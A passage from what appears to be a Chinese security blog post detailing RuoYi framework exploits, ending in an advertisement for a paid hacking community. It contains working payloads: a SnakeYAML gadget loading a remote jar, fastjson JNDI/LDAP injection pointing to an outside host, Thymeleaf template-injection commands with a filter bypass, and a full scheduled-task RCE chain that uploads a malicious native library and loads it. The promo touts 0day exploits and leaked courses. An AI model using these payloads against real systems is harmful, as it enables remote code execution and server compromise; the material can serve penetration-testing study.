org.yaml.snakeyaml.Yaml.load(’!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“**h’t’t’p’:**//127.0.0.1:88/yaml-payload.jar”]]]]’)
```  
# 0x07 fastjson反序列化  
  
关注两个函数 parse 和 parseObject JSONObject.parse  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNzpJg03M1syXM39QM1sA8HQ1lCBHcUBAm1O5ictrm9NOGJTibbSSLyvbA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNiaN13WicFvqooicgfGO7AiclYotzfrKmnicPcPItPhhq1Cqftjw4Zt96Whw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN2lQHjJVia1mmibjyONxl0hlOIurMk8M8YULtjjTic4ibGvG4ENI9eWS8MA/640?wx_fmt=png&from=appmsg "")  
  
  
开启 autotype  
```
params[@type]=org.apache.shiro.jndi.JndiObjectFactory&params[resourceName]=ldap://192.168.12.76:1389/09rlhv
```  
## ruoyi4.2.0  
  
初看这个数据包一堆参数，有点复杂，根据之前的分析梳理一下，需要的参数是  
tplCategory  
为tree  
，才能走到fastjson漏洞点  
,认真梳理一下需要的参数，发现还需要treeCode&treeParentCode  
参数，这块代码中全局搜索提示的缺少的内容的中文名称即可发现参数名称，填写上即可。  
  
最终简化后的数据包如下  
```
POST /tool/gen/edit HTTP/1.1Host: 172.16.0.66User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36Referer: http://172.16.0.66/tool/gen/edit/6Cookie: JSESSIONID=c229803b-e147-4853-ae79-df7e04dcd338X-Requested-With: XMLHttpRequestAccept: application/json, text/javascript, */*; q=0.01Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://172.16.0.66Accept-Language: zh-CN,zh;q=0.9Content-Length: 3610tableName=111111&tableComment=111111&className=111111&functionAuthor=111111&&columns[0].javaType=Long&columns[0].javaField=infoId&&tplCategory=tree&treeCode=111111&treeParentCode=111111&packageName=111111&moduleName=111111&businessName=111111&functionName=111111&params[treeCode]=111111&params[treeParentCode]=1&params[treeName]={"@type":"java.net.Inet4Address","val":"11.hb4r0s.dnslog.cn"}
```  
# 0x08 SSTI模版注入漏洞  
#### 漏洞版本  
  
在4.7.1版本CacheController类中  
  
![[../S24-25赛季-大黑客之路/红队知识学习/assets/Y10 若依ruoyi/file-20250416135654610.png]]  
#### 漏洞复现  
  
模板注入漏洞payload：  
  
return内容可控：  
```
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()}::.x
```  
  
URL路径可控：  
```
${T(java.lang.Runtime).getRuntime().exec("touch test")}::.x
```  
  
测试上述payload发现返回包返回500，具体情况是Thymeleaf3.0.12  
版本对这个版本进行了一些先知，防止模板注入漏洞，https://github.com/thymeleaf/thymeleaf/issues/809  
  
以下为防护的情况：  
  
我们将Payload改造一下，如${T (java.lang.Runtime).getRuntime().exec("calc.exe")}  
。在T和(之间多加几个空格即可，放入数据包中进行测试发现成功弹出计算器。  
  
这里为了方便演示，payload  
直接贴出来了，大家测试的时候记得进行URL  
编码。  
```
POST /monitor/cache/getNames HTTP/1.1fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a calculator')}__::.x
```  
```
cacheName=123&fragment=${T (java.lang.Runtime).getRuntime().exec(“calc.exe”)}
```  
#### 接口/monitor/cache/getKeys  
#### 接口/monitor/cache/getValue  
#### 接口/demo/form/localrefresh/task  
# 0x09 若依4.8.0版本计划任务RCE  
### 环境搭建  
  
https://github.com/yangzongzhuan/RuoYi/releases  
  
导入数据库，修改application-druid中的数据库账号密码  
  
修改application中的文件路径及log存放路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNHDbOojDzUGBRBctib3SFVkwvap8WiaxDqdQpDAHGUNIUTm8xTHITvkhQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNERUviaLu9zPhABjIOFL5CB7pXBM2iboIs4cdLy5LPazrRiblnIjUoPKDw/640?wx_fmt=png&from=appmsg "")  
  
  
启动成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNFYCUgMw8sXny5h2JMTb5O7mvh7YdnsogZZxrBNiavoDxHNHxaswMmAA/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
最新版本4.8 Ruoyi 后台⽬前限制  
- **规则**  
：invokeTarget  
  
必须包含  
com.ruoyi.quartz.task  
  
字符串。  
- **绕过思路**  
：  
- **子字符串匹配漏洞**  
：白名单检查使用  
StringUtils.containsAnyIgnoreCase  
，只要  
invokeTarget  
  
中**任意位置**  
包含白名单字符串即可，无需完全匹配包名。  
- **构造畸形类名**  
：例如  
xxx.com.ruoyi.quartz.task.yyy.EvilClass  
，虽然实际包名不在白名单内，但字符串包含  
com.ruoyi.quartz.task  
，可绕过白名单。  
```
/**       * 定时任务白名单配置（仅允许访问的包名，如其他需要可以自行添加）       */      public static final String[] JOB_WHITELIST_STR = { "com.ruoyi.quartz.task" };      /**       * 定时任务违规的字符       */      public static final String[] JOB_ERROR_STR = { "java.net.URL", "javax.naming.InitialContext", "org.yaml.snakeyaml",              "org.springframework", "org.apache", "com.ruoyi.common.utils.file", "com.ruoyi.common.config", "com.ruoyi.generator" };  }
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNjpx55BzzjhRK38nl074h9ic7DQZrzibuI9dSnJoW5WlWSr6C4UKaPuSg/640?wx_fmt=png&from=appmsg "")  
  
  
JOB_WHITELIST_STR 这个也就是com.ruoyi.quartz.task 其实不⽤类名 包含在⾃符串⾥⾯就⾏ 这⾥是invokeTarget⽽不是beanPackageName  
- **规则**  
：禁止使用  
java.net.URL  
、org.springframework  
  
等敏感包下的类。  
- **绕过思路**  
：  
- **寻找非黑名单类**  
：利用若依自身依赖或第三方库中未被黑名单覆盖的类。例如：  
- **工具类**  
：若依的  
com.ruoyi.common.utils  
  
下的某些工具类（需确认是否在  
JOB_ERROR_STR  
  
禁止的子包中）。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNibpMtDjforoUUqnby0Tib8ZYIoQMCcibaGdxWPu7bKZmYPW1eL0J5ia14w/640?wx_fmt=png&from=appmsg "")  
  
**白名单检查（**whiteList******方法）**  
```
public static boolean whiteList(String invokeTarget)      {          String packageName = StringUtils.substringBefore(invokeTarget, "(");          int count = StringUtils.countMatches(packageName, ".");          if (count > 1)          {              return StringUtils.containsAnyIgnoreCase(invokeTarget, Constants.JOB_WHITELIST_STR);          }          Object obj = SpringUtils.getBean(StringUtils.split(invokeTarget, ".")[0]);          String beanPackageName = obj.getClass().getPackage().getName();          return StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_WHITELIST_STR)                  && !StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_ERROR_STR);      }  }
```  
- **漏洞点**  
：当  
invokeTarget  
  
的包层级超过1层时（如  
a.b.c.method  
），仅检查是否包含白名单字符串，而非完整包路径。  
然后不⽤JOB_ERROR_STR 这个类⾥⾯的 从mvn install 后 从其他包下⾯去寻找可利⽤的类下的⽅法就⾏  
  
需要满⾜以下条件  
**方法参数解析（**getMethodParams**）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN2WKC3xGibOVgxicxLXLmHYWgWyfvNYcNLIoO4ia1ia2nvPATAgib3dQCe5Q/640?wx_fmt=png&from=appmsg "")  
```
public static List<Object[]> getMethodParams(String invokeTarget)  {      String methodStr = StringUtils.substringBetween(invokeTarget, "(", ")");      if (StringUtils.isEmpty(methodStr))      {          return null;      }      String[] methodParams = methodStr.split(",(?=([^\"']*[\"'][^\"']*[\"'])*[^\"']*$)");      List<Object[]> classs = new LinkedList<>();      for (int i = 0; i < methodParams.length; i++)      {          String str = StringUtils.trimToEmpty(methodParams[i]);          // String字符串类型，以'或"开头          if (StringUtils.startsWithAny(str, "'", "\""))          {              classs.add(new Object[] { StringUtils.substring(str, 1, str.length() - 1), String.class });          }          // boolean布尔类型，等于true或者false          else if ("true".equalsIgnoreCase(str) || "false".equalsIgnoreCase(str))          {              classs.add(new Object[] { Boolean.valueOf(str), Boolean.class });          }          // long长整形，以L结尾          else if (StringUtils.endsWith(str, "L"))          {            classs.add(new Object[] { Long.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Long.class });          }          // double浮点类型，以D结尾          else if (StringUtils.endsWith(str, "D"))          {              classs.add(new Object[] { Double.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Double.class });          }          // 其他类型归类为整形          else          {              classs.add(new Object[] { Integer.valueOf(str), Integer.class });          }      }      return classs;  }
```  
- **限制**  
：参数类型被强制约束为基本类型，无法传递复杂对象。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNOqMQ3JepRcoicwhLXS47GpcUc7zrs9Lu4icnicforWAm9MgacwjbLfib5A/640?wx_fmt=png&from=appmsg "")  
```
/**   * 执行方法   *   * @param sysJob 系统任务   */  public static void invokeMethod(SysJob sysJob) throws Exception  {      String invokeTarget = sysJob.getInvokeTarget();      String beanName = getBeanName(invokeTarget);      String methodName = getMethodName(invokeTarget);      List<Object[]> methodParams = getMethodParams(invokeTarget);      if (!isValidClassName(beanName))      {          Object bean = SpringUtils.getBean(beanName);          invokeMethod(bean, methodName, methodParams);      }      else      {          Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();          invokeMethod(bean, methodName, methodParams);      }  }
```  
  
传递的参数只能是其中的这些类型 通过 , 进⾏分割。substringBetween获取的是() ⾥⾯ 不能继续包含 )了会截断  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNZCZ4KZnM6CADju5lphbs5XzyOLvXibCjpdRC0kCEOXgspnVlTDh1wmQ/640?wx_fmt=png&from=appmsg "")  
```
public static String substringBetween(final String str, final String open, final String close) {      if (!ObjectUtils.allNotNull(str, open, close)) {          return null;      }      final int start = str.indexOf(open);      if (start != INDEX_NOT_FOUND) {          final int end = str.indexOf(close, start + open.length());          if (end != INDEX_NOT_FOUND) {              return str.substring(start + open.length(), end);          }      }      return null;  }
```  
  
那我们可以直接去找String 可控到sink 的类就可以了。  
  
这⾥反射的时候还需要注意 需要满⾜ 存在⼀个参构造 且都是public的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNxPjFRC22RFdAibicArJj43F9JkBTiacZjWVASEEJ2yHLAhTYUTiaxjyB7Q/640?wx_fmt=png&from=appmsg "")  
```
Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();
```  
#### 计划任务分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNyfPtknQyaQJ7pPqNLQ8v6XpvQfcJ3SHMoKCibicUJVeQXSRr5TZwN2kw/640?wx_fmt=png&from=appmsg "")  
  
根据提交数据包锁定后端路由  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNxxlLzudiaGWuiaIo6RWLia9hyWYt30ekicPCiaS3V5ndVu3Le9zfAubbt7Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN22XfXiajj8uRZKmGV6LcGib99Kdbg0YusHwicZOfYXmKLqjYn9HibTwyrw/640?wx_fmt=png&from=appmsg "")  
  
  
调试看一下具体做了什么  
  
前几个都是在判断是否有包含rmi ldap http关键词,禁止对这些协议进行调用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNyEBmJLrf5RicTjZJkkpj23LcVFAdY9VYrXFQicde8dPGHY3ibeTMnN9Bg/640?wx_fmt=png&from=appmsg "")  
  
  
还判断了是否有一些黑名单中的类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNeaJHEMQic2qYr4tACVDYEc2UicjqvBJAGX5An8jIuGkV12QETDFKwasQ/640?wx_fmt=png&from=appmsg "")  
  
  
进入白名单的判断  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNs4hdmKKjs48Kib9kajZu7s2jNqBGPbpKKqu8fricuNEIkX1WJib6qS4wA/640?wx_fmt=png&from=appmsg "")  
  
  
提取出调用的类名，判断其中是否包含白名单字符串  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN1UoSqtaDT1yicmRcphwOs70bnzOe9pjdmXBgXh5pKMPe57ibicy0PhIEw/640?wx_fmt=png&from=appmsg "")  
  
白名单字符串为com.ruoyi.quartz.task  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN6GxDMsjhCHwPa58ibL2jj78f47CcuM0QqIjGHYmibDjSib2ibnVzDibYCJQ/640?wx_fmt=png&from=appmsg "")  
  
注意这里是用正则去匹配的，所以该字符串在任意位置都可以，所以存在可以绕过的可能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNHjalAd76ibfS0gO3rdOf5XDmd3BPj4qU1c9eElbpf7VUZvUZWQ6q6Dw/640?wx_fmt=png&from=appmsg "")  
  
  
后续就会进入正常的j保存计划任务流程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNtggs7fiaTcFyicMvpjEib4k4V0iaTssbtuckxOnQAmSNMcFYLZyRdRzPnw/640?wx_fmt=png&from=appmsg "")  
  
  
当启动任务时，会调用方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNHFVVQKysJ0UPx4serTw2kdkIIqInicVhibbFZnThjPh4U4OuUqgx9Obg/640?wx_fmt=png&from=appmsg "")  
  
获取需要调用的类名方法名参数值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNIwSW3E1VVaYUGVInxeu1RBBOg8o2saB8PtsE5hBJB1xOj1Ve2ic5wGg/640?wx_fmt=png&from=appmsg "")  
  
在获取方法参数时进行了处理，只允许为字符串/布尔/长整/浮点/整形，无法传递类对象  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN0kUjtoViaQkto0tUpGibIgeg8Gq6OPaic7n1Rc3uVpz7Af0spY7Av6xgg/640?wx_fmt=png&from=appmsg "")  
  
接着会实例化该类，反射调用其方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNKJVicITamPrK6QCJlxegVfrUOkxibkyUMfcBOEFN73hialhyO9M5QzAGA/640?wx_fmt=png&from=appmsg "")  
  
该方法为public修饰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNPcXkfXXaH9iaNfJ2QibLmWiaKh5gNQMq0xXyMRicUu4YuywvBM7SrMAfOw/640?wx_fmt=png&from=appmsg "")  
  
我们想要利用需要达成的是  
- 使用的类不在黑名单中  
- 要存在com.ruoyi.quartz.task字符串  
- 不可以使用rmi ldap http协议  
#### 文件上传  
  
而在ruoyi中存在一个文件上传点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN3Rkzam1picdz4bAekm77h8IAgWQSgNXAbMh9EOWFQPOd4EP3ACSquog/640?wx_fmt=png&from=appmsg "")  
  
我们可以随便上传一个文件看看  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNfP1SqDdR0FuhWLGQtSFibf1vVYTdJJ4Rnv7oCSrwicJicGeicHzIqqcJ8g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNfaPh8jyPNdvXs0OlaTWYgEiagmnIghIWJ6sz0qnaicA2BVGEJBqEsSsA/640?wx_fmt=png&from=appmsg "")  
  
  
那么我们可以上传一个名字包含com.ruoyi.quartz.task字符串的文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNziaTvLzVe3r9GASjAIdTusnHzXn6fcdUS76LwVQV523r5Qh09wrfQjA/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
在java中存在一种机制叫做JNI，可以通过加载外部链接库，从而执行其中的<font style="color:rgba(0, 0, 0, 0.85);">构造函数</font>  
  
而com.sun.glass.utils.NativeLibLoader的loadLibrary方法就可以去加载链接库，也是public修饰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNx6xibPnYv5gNuIQYIpfa0lhyNPz2qZibfhEp3EmNgD7wEd8e5qA86qkQ/640?wx_fmt=png&from=appmsg "")  
```
POST /common/upload HTTP/1.1Host: 10.40.107.67Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1cx-forwarded-for: 127.0.0.1Connection: closeContent-Type: multipart/form-data; boundary=00content0boundary00Content-Length: 167--00content0boundary00Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"Content-Type: image/jpgsuccess--00content0boundary00--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN1mxRV0pclCzVc9Gs74nV2RIX1V3dftT16CAPkqRkMjg1X2FHuibD8uw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNV8fheDH0decXiaeWr1KgmowSnoulial3xpB4J39iaaFFytoF6UTqTBiaBQ/640?wx_fmt=png&from=appmsg "")  
```
cat calc.c #include <stdlib.h>__attribute__((constructor))static void run() {system("open -a Calculator");}
```  
```
POST /common/upload HTTP/1.1Host: 10.40.107.67Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1cx-forwarded-for: 127.0.0.1Connection: closeContent-Type: multipart/form-data; boundary=00content0boundary00Content-Length: 167--00content0boundary00Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"Content-Type: image/jpg二进制恶意代码--00content0boundary00--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN4Tic45Cxck2hibzUIyKYoleYC7sGibtmV3ibBF3VibpXvMRz9xWaOe71tibA/640?wx_fmt=png&from=appmsg "")  
  
  
注意他会自动在后面添加dylib等后缀，在不同的系统中可能有不同的后缀，并且要注意架构问题  
#   
#   
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
**内部圈子详情介绍**  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于800人 45元/年  
  
星球人数少于1000人 60元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUQrFWcBesgFeibmAaLTXbl25YKcjTuT0F7X8qBLgI7JaOjU1DxsgxfyicbBDibicKwvIhjia1Jm33NQaA/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满800人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXzIXhsuibSCxH9DL0qbmoy9fgFDcSWC6Yyg3eJsoE70q5jJ1OiaSQYcFsw/640?wx_fmt=jpeg&from=appmsg "")  
  
****  
    
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
